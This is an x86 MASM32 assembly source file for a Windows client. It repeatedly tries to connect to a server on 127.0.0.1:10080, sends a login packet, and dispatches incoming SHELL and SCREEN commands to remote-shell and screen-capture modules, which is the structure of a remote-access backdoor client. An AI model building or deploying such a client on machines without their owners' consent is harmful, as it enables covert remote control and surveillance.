.386
.model flat, stdcall
option casemap :none

__UNICODE__     equ     1

include network.inc
include mem_alloc.inc
include packet.inc
include shell.inc
include screen.inc

include /masm32/include/kernel32.inc
include /masm32/include/user32.inc
include /masm32/include/masm32rt.inc

includelib /masm32/lib/kernel32.lib
includelib /masm32/lib/user32.lib
includelib /masm32/lib/wsock32.lib


; Type of a packet
CONNECT             equ     1
DISCONNECT          equ     2

SOCKET_VERSION      equ     101h
SERVER_PORT         equ     10080

TRY_CONNECT_TIMES       equ     100
TRY_CONNECT_INTERVAL    equ     5   ; Seconds


Connect         proto   server_addr: ptr sockaddr_in
PacketDispatch  proto   header: ptr Header, data: ptr BYTE
NetworkLoop     proto
LoginNotify     proto
LoadModules     proto
FreeModules     proto


.const
SERVER_IP       BYTE        "127.0.0.1", 0
UCSTR           LOGIN_TAG,  "Hello, world", 0


.data
server      SOCKET      INVALID_SOCKET


.code
RecvData    proc    remote: SOCKET, data: ptr BYTE, data_size: DWORD
    local   @received: DWORD

    xor     ecx, ecx
    mov     @received, 0
    .while  ecx < data_size
        mov     ebx, data
        add     ebx, @received
        mov     edx, data_size
        sub     edx, @received
        invoke  recv, remote, ebx, edx, 0
        .if     eax == SOCKET_ERROR
            .break
        .endif
        mov     ecx, @received
        add     ecx, eax
        mov     @received, ecx
    .endw

    .if     eax != SOCKET_ERROR
        mov     eax, @received
    .endif
    ret
RecvData    endp


SendData    proc    remote: SOCKET, data: ptr BYTE, data_size: DWORD
    local   @sent: DWORD

    xor     ecx, ecx
    mov     @sent, 0
    .while  ecx < data_size
        mov     ebx, data
        add     ebx, @sent
        mov     edx, data_size
        sub     edx, @sent
        invoke  send, remote, ebx, edx, 0
        .if     eax == SOCKET_ERROR
            .break
        .endif
        mov     ecx, @sent
        add     ecx, eax
        mov     @sent, ecx
    .endw

    .if     eax != SOCKET_ERROR
        mov     eax, @sent
    .endif
    ret
SendData    endp


InitWinSocket       proc
    local   @wsa: WSADATA

    invoke  WSAStartup, SOCKET_VERSION, addr @wsa
    .if     eax != 0
        print   "Failed to initialize the socket library.", 0Dh, 0Ah
        mov     eax, FALSE
    .else
        mov     eax, TRUE
    .endif
    ret
InitWinSocket       endp


FreeWinSocket       proc
    invoke  WSACleanup
    ret
FreeWinSocket       endp


StartupService      proc    ip: ptr BYTE, port: DWORD
    local   @server_addr: sockaddr_in

    invoke  socket, AF_INET, SOCK_STREAM, 0
    .if     eax == INVALID_SOCKET
        print   "Failed to create a socket.", 0Dh, 0Ah
        jmp     _Exit
    .endif
    mov     server, eax

    invoke  RtlZeroMemory, addr @server_addr, sizeof @server_addr
    mov     @server_addr.sin_family, AF_INET
    invoke  htons, port
    mov     @server_addr.sin_port, ax
    mov     eax, ip
    invoke  inet_addr, eax
    mov     @server_addr.sin_addr.S_un.S_addr, eax

    ; Connect to the server
    invoke  Connect, addr @server_addr
    .if     eax == SOCKET_ERROR
        print   "Failed to connect to the server.", 0Dh, 0Ah
        jmp     _Exit
    .endif
    print   "The client has connected to the server.", 0Dh, 0Ah

    invoke  LoadModules

    ; Send a login packet to the server
    invoke  LoginNotify
    .if     eax == SOCKET_ERROR
        print   "The client failed to send login information to the server.", 0Dh, 0Ah
        jmp     _Exit
    .endif

    ; Enter a loop to keep receiving packets
    invoke  NetworkLoop

_Exit:
    invoke  StopService
    ret
StartupService      endp


StopService         proc
    .if server != INVALID_SOCKET
        invoke  closesocket, server
        mov     server, INVALID_SOCKET
        print   "The client has disconnected from the server.", 0Dh, 0Ah
    .endif

    invoke  FreeModules
    ret
StopService         endp


LoginNotify         proc
    local   @header: Header

    mov     @header.packet_type, CONNECT
    invoke  lstrlen, addr LOGIN_TAG
    inc     eax
    mov     ebx, 2
    mul     ebx
    mov     @header.data_size, eax
    invoke  SendPacket, server, addr @header, addr LOGIN_TAG
    ret
LoginNotify         endp


NetworkLoop         proc
    local   @header: Header
    local   @buffer: ptr BYTE

    mov     @buffer, NULL
    .while  TRUE
        invoke  RecvPacket, server, addr @header, addr @buffer
        .break  .if eax == SOCKET_ERROR

        ; Dispatch the packet to the handler
        invoke  PacketDispatch, addr @header, @buffer
        push    eax

        invoke  FreeMemory, @buffer
        mov     @buffer, NULL

        pop     eax
        .break  .if eax == FALSE
    .endw
    ret
NetworkLoop         endp


PacketDispatch      proc    header: ptr Header, data: ptr BYTE
    mov     esi, header
    mov     eax, dword ptr [esi + Header.packet_type]
    switch  eax
        case    DISCONNECT
            mov     eax, FALSE
        case    SHELL
            invoke  OnShell, server, header, data
        case    SCREEN
            invoke  OnScreen, server, header, data
        default
            mov     eax, TRUE
    endsw
    ret
PacketDispatch      endp


Connect             proc    server_addr: ptr sockaddr_in
    local   @i: DWORD

    mov     @i, 0
    .while  @i < TRY_CONNECT_TIMES
        invoke  connect, server, server_addr, sizeof sockaddr_in
        .if     eax == SOCKET_ERROR
            push    eax
            invoke  Sleep, TRY_CONNECT_INTERVAL * 1000
            mov     edx, @i
            inc     edx
            mov     @i, edx
            pop     eax
        .else
            .break
        .endif
    .endw
    ret
Connect             endp


LoadModules         proc
    invoke  InitDevice
    invoke  StartupShell, server
    ret
LoadModules         endp


FreeModules         proc
    invoke  StopShell
    invoke  FreeDevice
    ret
FreeModules         endp

end